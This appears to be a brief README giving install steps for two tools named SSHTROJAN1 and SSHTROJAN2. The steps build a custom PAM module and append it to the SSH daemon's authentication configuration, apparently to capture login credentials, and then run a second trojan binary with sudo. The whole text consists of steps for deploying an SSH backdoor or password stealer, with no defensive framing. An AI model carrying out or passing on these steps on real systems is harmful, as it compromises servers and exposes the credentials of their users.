SSHTROJAN1:

`sudo apt install libpam0g-dev`

`make`

`printf "auth optional pam_unix.so nullok_secure audit\nauth optional sshtrojan1.so" >>  /etc/pam.d/sshd`

/etc/pam.conf -> UsePam = yes

SSHTROJAN2:
`sudo ./sshtrojan2`
